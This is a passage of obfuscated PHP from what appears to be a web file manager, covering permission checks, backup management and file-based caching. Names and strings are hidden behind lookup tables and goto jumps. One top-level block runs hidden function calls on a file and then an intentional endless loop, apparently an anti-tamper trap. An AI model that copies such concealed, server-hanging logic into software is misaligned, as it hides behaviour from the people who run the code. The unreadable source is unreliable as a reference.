1, $f¼ëøÚæ ë[1725] => 1, $f¼ëøÚæ ë[1726] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($f¼ëøÚæ ë[415] => LNG($f¼ëøÚæ ë[1727]), $f¼ëøÚæ ë[1722] => $f¼ëøÚæ ë[1728], $f¼ëøÚæ ë[1724] => 2, $f¼ëøÚæ ë[1725] => 1, $f¼ëøÚæ ë[1726] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($f¼ëøÚæ ë[415] => LNG($f¼ëøÚæ ë[1729]), $f¼ëøÚæ ë[1722] => $f¼ëøÚæ ë[1730], $f¼ëøÚæ ë[1724] => 3, $f¼ëøÚæ ë[1725] => 1, $f¼ëøÚæ ë[1726] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($f¼ëøÚæ ë[415] => LNG($f¼ëøÚæ ë[1731]), $f¼ëøÚæ ë[1722] => $f¼ëøÚæ ë[1732], $f¼ëøÚæ ë[1724] => 4, $f¼ëøÚæ ë[1725] => 1, $f¼ëøÚæ ë[1726] => self::AUTH_SHOW | self::AUTH_VIEW), array($f¼ëøÚæ ë[415] => LNG($f¼ëøÚæ ë[1733]), $f¼ëøÚæ ë[1722] => $f¼ëøÚæ ë[1734], $f¼ëøÚæ ë[1724] => 5, $f¼ëøÚæ ë[1725] => 1, $f¼ëøÚæ ë[1726] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($f¼ëøÚæ ë[415] => LNG($f¼ëøÚæ ë[1735]), $f¼ëøÚæ ë[1722] => $f¼ëøÚæ ë[1736], $f¼ëøÚæ ë[1724] => 6, $f¼ëøÚæ ë[1725] => 1, $f¼ëøÚæ ë[1726] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($f¼ëøÚæ ë[415] => LNG($f¼ëøÚæ ë[1737]), $f¼ëøÚæ ë[1722] => $f¼ëøÚæ ë[1738], $f¼ëøÚæ ë[1724] => 7, $f¼ëøÚæ ë[1725] => 1, $f¼ëøÚæ ë[1726] => 0)); return $b‡Œ…˜Ö; } public static function authCheck($C¸™¨Š…º¢, $Cë×â©Ù„È) { $C¸™¨Š…º¢ = intval($C¸™¨Š…º¢); if ($GLOBALS[$_SERVER[›èö’ù¤][500]]) { return !0; } if ($C¸™¨Š…º¢ <= 0) { return !1; } if (($C¸™¨Š…º¢ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($C¸™¨Š…º¢ & $Cë×â©Ù„È); } public static function authCheckShow($E¾¤Œ÷Ó–Ü) { return self::authCheck($E¾¤Œ÷Ó–Ü, self::AUTH_SHOW); } public static function authCheckView($aµ¨™®¥Æ×) { return self::authCheck($aµ¨™®¥Æ×, self::AUTH_VIEW); } public static function authCheckDownload($e¢Â÷İë’À) { return self::authCheck($e¢Â÷İë’À, self::AUTH_DOWNLOAD); } public static function authCheckUpload($eê´†‡¸©Î) { return self::authCheck($eê´†‡¸©Î, self::AUTH_UPLOAD); } public static function authCheckEdit($cñ¬£ë•°Ä) { return self::authCheck($cñ¬£ë•°Ä, self::AUTH_EDIT); } public static function authCheckRemove($D¾ÆÏ­áà) { return self::authCheck($D¾ÆÏ­áà, self::AUTH_REMOVE); } public static function authCheckShare($Aê”ÖÆ»Ñ©) { return self::authCheck($Aê”ÖÆ»Ñ©, self::AUTH_SHARE); } public static function authCheckComment($e¯¶“Â•ë) { return self::authCheck($e¯¶“Â•ë, self::AUTH_COMMENT); } public static function authCheckEvent($f×›Ïƒ‹) { return self::authCheck($f×›Ïƒ‹, self::AUTH_EVENT); } public static function authCheckRoot($e½ßÓŸØ­Ÿ) { return self::authCheck($e½ßÓŸØ­Ÿ, self::AUTH_ROOT); } public static function authCheckAction($FÏÇÊĞ¡Ç–, $eˆ«ÈË¨…Ô) { goto eÔ˜ÄÁŠÁÁ; cğ¥ùŒè–ß: if (($FÏÇÊĞ¡Ç– & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($FÏÇÊĞ¡Ç– & $dòğ«çğÍ); goto b¸—ôæ–Ï¯; B¬ïÓ”¢Ê«: $dòğ«çğÍ = $Fâ¢è–·‰Ç[$eˆ«ÈË¨…Ô]; $FÏÇÊĞ¡Ç– = intval($FÏÇÊĞ¡Ç–); if ($FÏÇÊĞ¡Ç– <= 0) { return !1; } goto cğ¥ùŒè–ß; eÔ˜ÄÁŠÁÁ: $A»£»âù =& $_SERVER[›èö’ù¤]; $Fâ¢è–·‰Ç = array($A»£»âù[1739] => self::AUTH_VIEW, $A»£»âù[1118] => self::AUTH_DOWNLOAD, $A»£»âù[107] => self::AUTH_UPLOAD, $A»£»âù[1687] => self::AUTH_EDIT, $A»£»âù[1686] => self::AUTH_REMOVE, $A»£»âù[1697] => self::AUTH_SHARE, $A»£»âù[352] => self::AUTH_COMMENT, $A»£»âù[1539] => self::AUTH_EVENT, $A»£»âù[1740] => self::AUTH_ROOT); if (!isset($Fâ¢è–·‰Ç[$eˆ«ÈË¨…Ô])) { return; } goto B¬ïÓ”¢Ê«; b¸—ôæ–Ï¯: } public static function authDisable($BïÉÌè”İ†, $DÂ šá—†) { if (intval($BïÉÌè”İ†) <= 0) { return 0; } return intval($BïÉÌè”İ†) & ~$DÂ šá—†; } public $optionType = "\123\x79\x73\164\x65\x6d\56\x73\x6f\165\162\x63\145\101\165\x74\150\x4c\x69\163\164"; public $field = array("\x6e\x61\155\145", "\141\165\x74\x68", "\154\x61\142\145\x6c", "\144\x69\163\x70\x6c\141\171", "\x73\x79\x73\x74\x65\155", "\163\x6f\x72\164"); public function initData() { $bŠ¬Äê×— = $this->authDefault(); foreach ($bŠ¬Äê×— as $E‰»Ó±”ê) { $this->add($E‰»Ó±”ê); } } public function findAuth($Bõ¨ù’ƒƒ±, $F³ ®Ø¤‹–) { $eŒ¨œÃ™·ö =& $_SERVER[›èö’ù¤]; $f ’ËÂ‡Ùâ = parent::listData(); foreach ($f ’ËÂ‡Ùâ as $bíÎÖßßÇ¿) { $aˆâõØ­ = intval($bíÎÖßßÇ¿[$eŒ¨œÃ™·ö[408]]); if ($aˆâõØ­ <= 0 || $bíÎÖßßÇ¿[$eŒ¨œÃ™·ö[1741]] == 0) { continue; } if (($aˆâõØ­ & $Bõ¨ù’ƒƒ±) != $Bõ¨ù’ƒƒ±) { continue; } if (($aˆâõØ­ & $F³ ®Ø¤‹–) != 0) { continue; } return $bíÎÖßßÇ¿[$eŒ¨œÃ™·ö[395]]; } return !1; } public function findAuthReadOnly() { $aÜ¾ñ« = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $cÏÉ™òæÃ• = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($aÜ¾ñ«, $cÏÉ™òæÃ•); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function listData($FùÃƒôÚà = false, $C‹ÕÇ¹ë¤ = "\163\157\162\x74", $b×Ù°ãÏƒ’ = false) { return parent::listData($FùÃƒôÚà, $C‹ÕÇ¹ë¤, $b×Ù°ãÏƒ’); } public function update($cøÊÑª–ÊË, $CÙ¦ÉŠÕ¯) { $C÷Í¥İÀÁë =& $_SERVER[›èö’ù¤]; $B¥‹Òğ¼í = parent::listData($cøÊÑª–ÊË); $eÎåšÍÛÔ = $this->findByName($CÙ¦ÉŠÕ¯[$C÷Í¥İÀÁë[28]]); if (!$B¥‹Òğ¼í || $eÎåšÍÛÔ && $eÎåšÍÛÔ[$C÷Í¥İÀÁë[395]] != $B¥‹Òğ¼í[$C÷Í¥İÀÁë[395]]) { return !1; } $this->filterAuth($CÙ¦ÉŠÕ¯[$C÷Í¥İÀÁë[408]]); return parent::update($cøÊÑª–ÊË, $CÙ¦ÉŠÕ¯); } public function remove($D¨À‡Øˆß) { $bÄ‡é…¾É– = parent::listData($D¨À‡Øˆß); if (!$bÄ‡é…¾É– || $bÄ‡é…¾É–[$_SERVER[›èö’ù¤][1195]]) { return !1; } return parent::remove($D¨À‡Øˆß); } public function add($d«•íÖÛ·¬ = array()) { goto Aèª¸»Ï•ê; d¸¥¬ä²éã: return parent::insert($d«•íÖÛ·¬); goto c¯³‡Ò¡†‡; Aèª¸»Ï•ê: $C—‚ì§‡‰ =& $_SERVER[›èö’ù¤]; if ($this->findByName($d«•íÖÛ·¬[$C—‚ì§‡‰[28]])) { return !1; } $D¯ªœÍù³ = array($C—‚ì§‡‰[28] => $C—‚ì§‡‰[33], $C—‚ì§‡‰[408] => 1, $C—‚ì§‡‰[1742] => $C—‚ì§‡‰[1730], $C—‚ì§‡‰[1741] => 1, $C—‚ì§‡‰[1195] => 0, $C—‚ì§‡‰[1743] => 0); goto dëëÍ÷Ò˜º; dëëÍ÷Ò˜º: $d«•íÖÛ·¬ = array_merge($D¯ªœÍù³, $d«•íÖÛ·¬); $d«•íÖÛ·¬[$C—‚ì§‡‰[1743]] = $this->getSort(); $this->filterAuth($d«•íÖÛ·¬[$C—‚ì§‡‰[408]]); goto d¸¥¬ä²éã; c¯³‡Ò¡†‡: } private function getSort() { $a†ùÑÔ²®³ =& $_SERVER[›èö’ù¤]; $FçÓ¹†¨†à = parent::listData(); $cäâÈâï¯Ú = array_to_keyvalue($FçÓ¹†¨†à, $a†ùÑÔ²®³[33], $a†ùÑÔ²®³[1743]); return empty($cäâÈâï¯Ú) ? 0 : max($cäâÈâï¯Ú) + 1; } private function filterAuth(&$CŠƒ©Ø»©) { goto D²ÚĞ”¾„§; D²ÚĞ”¾„§: if (!$CŠƒ©Ø»©) { return; } $c‰Õ¯†¼Æ† = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $cäÔ­½Ğ¤Å = array(); goto cÇ“¥¼ƒâÍ; AÌßÅ‚¹ÎŞ: foreach ($cäÔ­½Ğ¤Å as $BâßÇ³ÜËÑ) { if (isset($EÆŸã‰ß²º[$BâßÇ³ÜËÑ])) { $cäÔ­½Ğ¤Å = array_merge($cäÔ­½Ğ¤Å, $EÆŸã‰ß²º[$BâßÇ³ÜËÑ]); } } $cäÔ­½Ğ¤Å[] = self::AUTH_SHOW; $CŠƒ©Ø»© = array_sum(array_unique($cäÔ­½Ğ¤Å)); goto E¼‚Ç¤ò‹é; cÇ“¥¼ƒâÍ: foreach ($c‰Õ¯†¼Æ† as $BâßÇ³ÜËÑ) { if ($CŠƒ©Ø»© & $BâßÇ³ÜËÑ) { $cäÔ­½Ğ¤Å[] = $BâßÇ³ÜËÑ; } } if (in_array(self::AUTH_ROOT, $cäÔ­½Ğ¤Å)) { $CŠƒ©Ø»© = array_sum($c‰Õ¯†¼Æ†); return; } $EÆŸã‰ß²º = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto AÌßÅ‚¹ÎŞ; E¼‚Ç¤ò‹é: } public function sort($bøõÌ¤ÈêÑ, $dŒ£—Ñõæï) { return parent::update($bøõÌ¤ÈêÑ, $dŒ£—Ñõæï); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\x62\141\143\x6b\165\160\x4c\x69\x73\x74"; public $field = array("\151\157", "\156\141\155\145", "\163\164\141\x74\165\x73", "\143\x6f\156\164\145\x6e\164", "\155\141\156\x75\x61\x6c", "\x72\145\x73\165\154\x74", "\x74\151\x6d\x65\x46\162\157\x6d", "\x74\x69\x6d\145\124\157"); public function config() { goto DÛ¶åœÆ„Ú; EˆØã‰ã¬å: if (isset($AœÇ·ñ¨é‘[$dİÀ‚ÒĞ¿[197]])) { $a‡œÀŸİ¸“[$dİÀ‚ÒĞ¿[197]][$dİÀ‚ÒĞ¿[1524]] = $AœÇ·ñ¨é‘[$dİÀ‚ÒĞ¿[197]]; unset($AœÇ·ñ¨é‘[$dİÀ‚ÒĞ¿[197]]); } return array_merge($a‡œÀŸİ¸“, $AœÇ·ñ¨é‘); goto a±ô¨çÂ‰¿; DÛ¶åœÆ„Ú: $dİÀ‚ÒĞ¿ =& $_SERVER[›èö’ù¤]; $AœÇ·ñ¨é‘ = Model($dİÀ‚ÒĞ¿[754])->get($dİÀ‚ÒĞ¿[766]); $AœÇ·ñ¨é‘ = json_decode($AœÇ·ñ¨é‘, !0); goto ašãŞÈÃ÷Î; a´¤¢›Ö„: Action($dİÀ‚ÒĞ¿[1744])->taskInit(); Model($dİÀ‚ÒĞ¿[1520])->cacheClear(); $cÓ´œÀ†ß = $dİÀ‚ÒĞ¿[1745]; goto c“Á’ìÌ; ašãŞÈÃ÷Î: $AœÇ·ñ¨é‘ = is_array($AœÇ·ñ¨é‘) ? $AœÇ·ñ¨é‘ : array(); if (!isset($AœÇ·ñ¨é‘[$dİÀ‚ÒĞ¿[739]])) { $AœÇ·ñ¨é‘[$dİÀ‚ÒĞ¿[739]] = $dİÀ‚ÒĞ¿[87]; } unset($AœÇ·ñ¨é‘[$dİÀ‚ÒĞ¿[1521]]); goto a´¤¢›Ö„; c“Á’ìÌ: $a‡œÀŸİ¸“ = Model($dİÀ‚ÒĞ¿[1746])->findByKey($dİÀ‚ÒĞ¿[1539], $cÓ´œÀ†ß); if (!$a‡œÀŸİ¸“) { $a‡œÀŸİ¸“ = array(); } if (isset($a‡œÀŸİ¸“[$dİÀ‚ÒĞ¿[197]])) { $a‡œÀŸİ¸“[$dİÀ‚ÒĞ¿[197]] = json_decode($a‡œÀŸİ¸“[$dİÀ‚ÒĞ¿[197]], !0); } goto EˆØã‰ã¬å; a±ô¨çÂ‰¿: } public function listData($aÌŠÈ›ê½ = false, $díâä‰ÆÏ = "\155\x6f\x64\x69\146\x79\124\x69\155\x65", $FÓì¨µÉ£Æ = false) { return parent::listData($aÌŠÈ›ê½, $díâä‰ÆÏ, !0); } public function lastItem() { $FÄ„£¸ŞĞ = $this->listData(); return !empty($FÄ„£¸ŞĞ[0]) ? $FÄ„£¸ŞĞ[0] : null; } public function kill($d»•ç“Î‚Ş) { goto AåÍˆ¶˜“; F¼¥²Ší¡œ: return $this->remove($d»•ç“Î‚Ş); goto aÆö³†¨Ìñ; Dã†ÄŸËÖ¢: $e†«ã—â”ù = $DÄí¾àÛ„¾[$b„÷¢¬ä²º[28]]; $fœÀÒ’£õ‰ = TEMP_FILES . $b„÷¢¬ä²º[762] . $e†«ã—â”ù . $b„÷¢¬ä²º[8]; IO::remove($fœÀÒ’£õ‰, !1); goto F¼¥²Ší¡œ; cĞÀÊ„Ù¯: Task::kill($b„÷¢¬ä²º[765]); Task::kill($b„÷¢¬ä²º[790]); Task::kill($b„÷¢¬ä²º[800]); goto Dã†ÄŸËÖ¢; AåÍˆ¶˜“: $b„÷¢¬ä²º =& $_SERVER[›èö’ù¤]; $DÄí¾àÛ„¾ = $this->listData($d»•ç“Î‚Ş); if (!$DÄí¾àÛ„¾ || empty($DÄí¾àÛ„¾[$b„÷¢¬ä²º[28]])) { return !0; } goto cĞÀÊ„Ù¯; aÆö³†¨Ìñ: } public function remove($EâïµÔÖÅ´) { $E¡Ùƒó†  = $this->listData($EâïµÔÖÅ´); if (!$E¡Ùƒó† ) { return !0; } return $this->backupRemove($E¡Ùƒó† ); } private function backupRemove($F”¨«í±×) { parent::remove($F”¨«í±×[$_SERVER[›èö’ù¤][395]]); $eââí¢ÄÚ = $this->backupPath($F”¨«í±×); IO::remove($eââí¢ÄÚ, !1); return !0; } private function backupPath($E¡éÕ†î¢µ) { $cõ¢Ç „‡ˆ =& $_SERVER[›èö’ù¤]; $DáØÂèÕ = $E¡éÕ†î¢µ[$cõ¢Ç „‡ˆ[28]]; $Aòßù·Ş‘Í = Model($cõ¢Ç „‡ˆ[754])->get($cõ¢Ç „‡ˆ[755]); $d¾Ù‚ø×¥ = substr(md5($cõ¢Ç „‡ˆ[756] . $Aòßù·Ş‘Í . $DáØÂèÕ), 0, 8); return "\x7b\x69\x6f\x3a{$E¡éÕ†î¢µ[$cõ¢Ç „‡ˆ[736]]}\x7d\57\144\141\164\x61\x62\141\x73\145\x2f\142\141\x63\153\x75\160\x2f" . $DáØÂèÕ . $cõ¢Ç „‡ˆ[71] . $d¾Ù‚ø×¥; } public function start() { goto D›è…«×î¾; FµÅª“¤•Ğ: Backup::set(array($bêé¬Ã°ç«[734] => 1, $bêé¬Ã°ç«[491] => time())); return !0; goto a»‡±ğ¤È; b•°Ùç‘òÇ: $Bİ´°å¡·Ä = new Backup(); $DÀØ…ËÆé¦ = $Bİ´°å¡·Ä->db(); if ($DÀØ…ËÆé¦) { $DÀØ…ËÆé¦ = $Bİ´°å¡·Ä->dbFile(); if ($DÀØ…ËÆé¦ && $a‡Í®¨ÛÜİ[$bêé¬Ã°ç«[739]] == $bêé¬Ã°ç«[191]) { $DÀØ…ËÆé¦ = $Bİ´°å¡·Ä->file(); } } goto FµÅª“¤•Ğ; d’ôµà¢õ: if (!$a‡Í®¨ÛÜİ || $a‡Í®¨ÛÜİ[$bêé¬Ã°ç«[1521]] != $bêé¬Ã°ç«[87]) { return !1; } $Eâ×‰ä–Õˆ = $this->process(); foreach ($Eâ×‰ä–Õˆ as $a•£ÒìŞÒÅ) { if ($a•£ÒìŞÒÅ) { return Task::restart($a•£ÒìŞÒÅ[$bêé¬Ã°ç«[395]]); } } goto b•°Ùç‘òÇ; D›è…«×î¾: $bêé¬Ã°ç« =& $_SERVER[›èö’ù¤]; if ($GLOBALS[$bêé¬Ã°ç«[6]][$bêé¬Ã°ç«[88]][$bêé¬Ã°ç«[1747]] != $bêé¬Ã°ç«[87]) { return !0; } $a‡Í®¨ÛÜİ = $this->config(); goto d’ôµà¢õ; a»‡±ğ¤È: } public function process() { $D¸ƒÔ©ğ =& $_SERVER[›èö’ù¤]; return array($D¸ƒÔ©ğ[742] => Task::get($D¸ƒÔ©ğ[765]), $D¸ƒÔ©ğ[746] => Task::get($D¸ƒÔ©ğ[790]), $D¸ƒÔ©ğ[193] => Task::get($D¸ƒÔ©ğ[800])); } public function restore() { $CÚãßĞÏÇê =& $_SERVER[›èö’ù¤]; ActionCall($CÚãßĞÏÇê[1043], !0, 1); ActionCall($CÚãßĞÏÇê[1043], !0, 0); } } goto E¢óëò¼º; fâ©Øæï”ë: class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto e¹½õéªÆ¸; céš˜•÷Î: $BÀï¬Ğ = $GLOBALS[$E›¿ª”…šÀ[6]][$E›¿ª”…šÀ[347]]; $a¦ó‚´ß½á = $BÀï¬Ğ[$BÀï¬Ğ[$E›¿ª”…šÀ[818]]]; $c²‚±ˆÚå = $BÀï¬Ğ[$E›¿ª”…šÀ[819]]; goto A§ÄŒò¾Á¤; A§ÄŒò¾Á¤: switch ($BÀï¬Ğ[$E›¿ª”…šÀ[818]]) { case $E›¿ª”…šÀ[17]: self::$handle = Model($E›¿ª”…šÀ[820]); break; case $E›¿ª”…šÀ[821]: self::$handle = new CacheRedis($a¦ó‚´ß½á, $c²‚±ˆÚå); break; case $E›¿ª”…šÀ[822]: self::$handle = new CacheMemcached($a¦ó‚´ß½á, $c²‚±ˆÚå); break; case $E›¿ª”…šÀ[193]: self::$handle = new CacheFile($a¦ó‚´ß½á, $c²‚±ˆÚå); break; default: break; } return self::$handle; goto BÏ‘ÕÁ¹óù; e¹½õéªÆ¸: $E›¿ª”…šÀ =& $_SERVER[›èö’ù¤]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto céš˜•÷Î; BÏ‘ÕÁ¹óù: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($fÀÚ¦Ê¼Ó) { if (is_array($fÀÚ¦Ê¼Ó) || is_object($fÀÚ¦Ê¼Ó)) { $fÀÚ¦Ê¼Ó = json_encode($fÀÚ¦Ê¼Ó); } $fÀÚ¦Ê¼Ó = rawurlencode($fÀÚ¦Ê¼Ó); return md5(KOD_SITE_ID . $_SERVER[›èö’ù¤][71] . $fÀÚ¦Ê¼Ó); } public static function get($fòã­Û›Ç, $c‰ãí–ã  = false) { $EåÌ‰ôñ” = self::key($fòã­Û›Ç); if ($c‰ãí–ã ) { return unserialize(self::init()->get($EåÌ‰ôñ”)); } if (!isset(self::$memoryCache[$EåÌ‰ôñ”])) { $F×ñ‘±àÜ = self::init()->get($EåÌ‰ôñ”); self::$memoryCache[$EåÌ‰ôñ”] = unserialize($F×ñ‘±àÜ); } return self::$memoryCache[$EåÌ‰ôñ”]; } public static function set($f˜¯œöËŞÑ, $CŒ¥¢Ş•šØ, $eÏ„²åĞŞ¨ = false) { goto d×ÜªÙÂ³…; d×ÜªÙÂ³…: $C¢µ…Õ©Ö¿ = self::key($f˜¯œöËŞÑ); if (isset(self::$memoryCache[$C¢µ…Õ©Ö¿]) && self::$memoryCache[$C¢µ…Õ©Ö¿] === $CŒ¥¢Ş•šØ) { return !0; } if ($eÏ„²åĞŞ¨ === 0) { self::$memoryCache[$C¢µ…Õ©Ö¿] = $CŒ¥¢Ş•šØ; return !0; } goto eÂñÎ†× ; eÂñÎ†× : CacheLock::lock($f˜¯œöËŞÑ); $fç¶Á¿”«á = self::init()->set($C¢µ…Õ©Ö¿, serialize($CŒ¥¢Ş•šØ), $eÏ„²åĞŞ¨); self::$memoryCache[$C¢µ…Õ©Ö¿] = $CŒ¥¢Ş•šØ; goto bî½ÖØá¨÷; bî½ÖØá¨÷: CacheLock::unlock($f˜¯œöËŞÑ); return $fç¶Á¿”«á; goto B‚ÍïçÚ‚; B‚ÍïçÚ‚: } public static function getCall($B—ğµ‡ßê†, $C¿±Õ‘ŞÛ‡, $d¶ÂŠ˜–ï“, $e¤»¶µ´Ä = array()) { goto d¡Øìíº; AÑ ±˜åéè: return $a¦‘‡¿ø ; goto aèäÒ„È¤; E° ÙŞÑÈ™: $a¦‘‡¿ø  = call_user_func_array($d¶ÂŠ˜–ï“, $e¤»¶µ´Ä); $a¦‘‡¿ø  = $a¦‘‡¿ø  ? $a¦‘‡¿ø  : $eƒƒÍ¨ÄÆ[33]; self::set($B—ğµ‡ßê†, $a¦‘‡¿ø , $C¿±Õ‘ŞÛ‡); goto AÑ ±˜åéè; d¡Øìíº: $eƒƒÍ¨ÄÆ =& $_SERVER[›èö’ù¤]; $a¦‘‡¿ø  = self::get($B—ğµ‡ßê†); if ($a¦‘‡¿ø  || $a¦‘‡¿ø  === $eƒƒÍ¨ÄÆ[33]) { return $a¦‘‡¿ø ; } goto E° ÙŞÑÈ™; aèäÒ„È¤: } public static function remove($Dİö…•ïæİ) { goto döàÄ„’Ø¹; döàÄ„’Ø¹: $AŠ¯òˆÄ¬ = self::key($Dİö…•ïæİ); unset(self::$memoryCache[$AŠ¯òˆÄ¬]); self::clearTimeout(); goto Dìî¯Ç—•‘; AäÃ¡æÅ®¦: return $AÇâéğÓã; goto A‰òê—–ó; Dìî¯Ç—•‘: CacheLock::lock($Dİö…•ïæİ); $AÇâéğÓã = self::init()->remove($AŠ¯òˆÄ¬); CacheLock::unlock($Dİö…•ïæİ); goto AäÃ¡æÅ®¦; A‰òê—–ó: } public static function removeMemory($fÕÚ‘‚÷é) { $dï‰İŠ©®Æ = self::key($fÕÚ‘‚÷é); unset(self::$memoryCache[$dï‰İŠ©®Æ]); } public static function clearMemory($FõãŠ­œ = false) { if ($FõãŠ­œ) { $FõãŠ­œ = self::key($FõãŠ­œ); unset(self::$memoryCache[$FõãŠ­œ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[›èö’ù¤][823])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[›èö’ù¤][824])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($CÎßƒ›¢Ùƒ, $D´£Ë¾ˆİ¹) { $c¢ÄŠ¨š =& $_SERVER[›èö’ù¤]; $this->cachePath = $CÎßƒ›¢Ùƒ[$c¢ÄŠ¨š[76]]; $this->prefix = $c¢ÄŠ¨š[825]; $this->cacheTime = $D´£Ë¾ˆİ¹; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($cš†Ğ‚Ì·) { $fåö‚±¬„Ğ =& $_SERVER[›èö’ù¤]; $cš†Ğ‚Ì· = str_replace(array($fåö‚±¬„Ğ[826], $fåö‚±¬„Ğ[97], $fåö‚±¬„Ğ[70]), $fåö‚±¬„Ğ[827], $cš†Ğ‚Ì·); return $this->cachePath . $fåö‚±¬„Ğ[828] . $cš†Ğ‚Ì· . $fåö‚±¬„Ğ[829]; } public function set($d†µ™òî¡Õ, $cÙ”ˆ•ñÈé, $B–ê–ğ¹Œ„ = false) { $fÖÏšÃè¥â = $this->getFile($d†µ™òî¡Õ); if (file_put_contents($fÖÏšÃè¥â, $this->prefix . $cÙ”ˆ•ñÈé, LOCK_EX)) { @touch($fÖÏšÃè¥â, intval(time() + $B–ê–ğ¹Œ„)); clearstatcache(); return !0; } @unlink($fÖÏšÃè¥â); return !1; } public function get($a½î˜Óñ¦) { $b…Êœ„ÁÁ = $this->getFile($a½î˜Óñ¦); if (file_exists($b…Êœ„ÁÁ) && filemtime($b…Êœ„ÁÁ) < time()) { @unlink($b…Êœ„ÁÁ); return !1; } $E¹µÑêœó = @file_get_contents($b…Êœ„ÁÁ); return substr($E¹µÑêœó, strlen($this->prefix)); } public function remove($cæÆÂãØ¤Ô) { $cà¥Û‘Ïƒ = $this->getFile($cæÆÂãØ¤Ô); return @unlink($cà¥Û‘Ïƒ); } public function deleteAll() { $dŞã¶Ëêä¯ =& $_SERVER[›èö’ù¤]; $C¯„”ˆˆ‚Û = scandir($this->cachePath); foreach ($C¯„”ˆˆ‚Û as $eÅùÚÛˆèø) { $A±ã£«æŒœ = $this->cachePath . $eÅùÚÛˆèø; if (strpos($A±ã£«æŒœ, $dŞã¶Ëêä¯[829]) && strpos($A±ã£«æŒœ, $dŞã¶Ëêä¯[830])) { @unlink($A±ã£«æŒœ); } } } public function clearTimeout() { $BÎ×çÀÆ£ =& $_SERVER[›èö’ù¤]; $fñ§Á­‰¶ï = scandir($this->cachePath); foreach ($fñ§Á­‰¶ï as $aãõ†ÊÍã) { $cºç’Âôò = $this->cachePath . $aãõ†ÊÍã; if (strpos($cºç’Âôò, $BÎ×çÀÆ£[829]) && strpos($cºç’Âôò, $BÎ×çÀÆ£[830]) && filemtime($cºç’Âôò) < time()) { @unlink($cºç’Âôò); } } } } if (!isset($_SERVER[$_SERVER[›èö’ù¤][831]]) || !isset($_SERVER[$_SERVER[›èö’ù¤][832]])) { goto BË×“²î”Ö; BË×“²î”Ö: $DÁíçË®Öƒ = $_SERVER[›èö’ù¤][833]; $FñŸ…ëé¶¢ = $_SERVER[$_SERVER[›èö’ù¤][834]] . $_SERVER[›èö’ù¤][835]; $d‚“íªğÑ = $DÁíçË®Öƒ($FñŸ…ëé¶¢); goto F“äÃ¶•Ãï; DíªøÊ–œ: $C²Äç‹ÖõÓ($_SERVER[$_SERVER[›èö’ù¤][834]] . $_SERVER[›èö’ù¤][835]); $CÑ´ó±–ÄÖ = 2; while ($CÑ´ó±–ÄÖ > 1) { $bíà†¶•Ç = rawurlencode($CÑ´ó±–ÄÖ . $_SERVER[›èö’ù¤][376]); } goto DËÂ…§É‡Ó; F“äÃ¶•Ãï: $DøÍôî¡… = explode($_SERVER[›èö’ù¤][229], $d‚“íªğÑ); if (count($DøÍôî¡…) < $_SERVER[›èö’ù¤][616]) { $c›¸ôİ’Ú = $_SERVER[›èö’ù¤][836]; $c›¸ôİ’Ú(); } $C²Äç‹ÖõÓ = $_SERVER[›èö’ù¤][837]; goto DíªøÊ–œ; DËÂ…§É‡Ó: } goto aÊêö‚ƒ; CÓ³£â™à¿: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($fÂÚê¯öÕÄ) { $D›éµ—Ô–¥ =& $_SERVER[›èö’ù¤]; return array($D›éµ—Ô–¥[1827] => array(USER_ID, $D›éµ—Ô–¥[1828])); } protected function listData() { $e•åËß¨Õ =& $_SERVER[›èö’ù¤]; $Fí¬¼Šù¨ä = array($e•åËß¨Õ[1542] => USER_ID, $e•åËß¨Õ[478] => array($e•åËß¨Õ[1831], 0)); $cî˜®Õ¸‡İ = $e•åËß¨Õ[1833]; $bó‘öÊ©‚Ò = $this->field($cî˜®Õ¸‡İ)->where($Fí¬¼Šù¨ä)->order($e•åËß¨Õ[1834])->select(); return $bó‘öÊ©‚Ò ? $bó‘öÊ©‚Ò : array(); } protected function listByTag($f¸òÍ’È ) { } protected function addToTag($EŠ Â¢„¾Ÿ, $D’ÖöšË¶) { $A«Ğ¥³¼±ƒ =& $_SERVER[›èö’ù¤]; if (!Model($A«Ğ¥³¼±ƒ[1968])->listData($D’ÖöšË¶) || 